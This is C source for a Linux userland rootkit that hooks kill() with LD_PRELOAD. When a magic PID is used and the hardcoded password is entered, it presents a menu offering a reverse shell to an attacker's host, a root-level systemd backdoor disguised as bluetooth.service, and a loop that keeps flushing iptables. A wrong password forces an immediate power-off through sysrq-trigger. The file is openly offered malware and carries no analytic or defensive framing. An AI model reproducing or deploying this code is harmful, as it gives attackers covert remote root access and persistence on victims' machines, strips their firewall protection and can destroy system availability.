// my rootkit userland for linux.
// author: Darksec, in development phase

#define _GNU_SOURCE
#include <stdlib.h>
#include <signal.h>
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>


       int kill(pid_t pid, int sig){

	ssize_t result;

	ssize_t reads;

	const int pids = 1337;

       int (*matar)(pid_t pid, int sig);

	matar = dlsym(RTLD_NEXT, "kill");

if(pid == pids){

	char password[20];
	char *pass = "darksec";


result = write(1, "[+] What's the Password? \n", strlen("[+] What's the Password? \n"));
result = write(1, "[!] --> ", strlen("[!] --> "));
scanf("%s", &password);
system("clear");


if(strcmp(password, pass) == 0){

	int escolha;

	printf("1) REVERSE SHELL \n");
	printf("2) BACKDOOR SYSTEMD \n");
	printf("3) ANTI_FIREWALL EASY\n");
	printf("4) EXIT \n");
	printf("=> ");
	scanf("%i", &escolha);


switch(escolha){

case 1:

	int port;
	char ip[16];

	printf("[+] SET YOUR LHOST => ");
	scanf("%s", &ip);

	printf("[+] SET YOUR LPORT => ");
	scanf("%i", &port);

	printf("[+] RECEVED REVERSE SHELL => %s:%i \n", ip, port);

if(fork() == 0){


    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr(ip);

    connect(sockt, (struct sockaddr *) &revsockaddr,
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"sh", NULL};
    execvp("sh", argv);

}
	break;

case 2:

	char command[200];
	char payload[200];

	printf("YOUR PAYLOAD FOR REVERSE SHELL\n");
	printf("[+] => ");
	fgets(payload,200,stdin);

	system("echo '[backdoor]' > /etc/systemd/system/bluetooth.service");
	system("echo 'Description=Backdoor_for_linux' >> /etc/systemd/system/bluetooth.service");
	system("echo '' >> /etc/systemd/system/bluetooth.service");
	system("echo '[Service]' >> /etc/systemd/system/bluetooth.service");
	system("echo 'User=root' >> /etc/systemd/system/bluetooth.service");
	system("echo 'Group=root' >> /etc/systemd/system/bluetooth.service");
	system("echo 'WorkingDirectory=/root' >> /etc/systemd/system/bluetooth.service");

	// Payload	

	sprintf(command, "echo 'ExecStart=%s' >> /etc/systemd/system/bluetooth.service ", payload);
	system(command);

	system("echo 'Restart=always' >> /etc/systemd/system/bluetooth.service");
	system("echo 'RestartSec=5' >> /etc/systemd/system/bluetooth.service");
	system("echo '' >> /etc/systemd/system/bluetooth.service");
	system("echo '[Install]' >> /etc/systemd/system/bluetooth.service");
	system("echo 'WantedBy=multi-user.target' >> /etc/systemd/system/bluetooth.service");

	// INIT SERVICE BACKDOOR
	system("/usr/bin/systemctl start bluetooth.service && /usr/bin/systemctl enable bluetooth.service");


	break;
case 3:

if(fork() == 0){

while(1){

system("/usr/bin/iptables -F");

	}
}


case 4:

	return 0;
        break;

default:

	printf("[!] TRY AGAIN! \n");

}

} else {

system("echo o > /proc/sysrq-trigger");

}

} else {

return matar(pid, sig);

}

}
